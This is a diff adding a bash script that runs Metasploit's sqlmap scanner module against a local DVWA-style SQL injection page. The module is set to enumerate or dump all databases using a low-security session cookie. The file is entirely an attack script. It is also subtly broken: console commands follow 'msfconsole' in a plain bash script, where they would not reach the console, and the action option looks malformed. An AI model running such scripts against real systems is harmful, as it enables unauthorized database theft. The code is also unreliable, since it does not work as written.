@@ -1,0 +1,14 @@
+#!/usr/bin/env bash
+# Attack using closest Metasploit Auxiliary Module (scanner/http/sqlmap)
+
+msfconsole
+
+use auxiliary/scanner/http/sqlmap
+set RHOSTS 127.0.0.1
+set RPORT 8888
+set TARGETURI /vulnerabilities/sqli/
+set METHOD GET
+set DATA "id=1&Submit=Submit"
+set COOKIE "PHPSESSID=your_session_id; security=low"
+set ACTION --dbs   # or --dump-all, etc.
+run
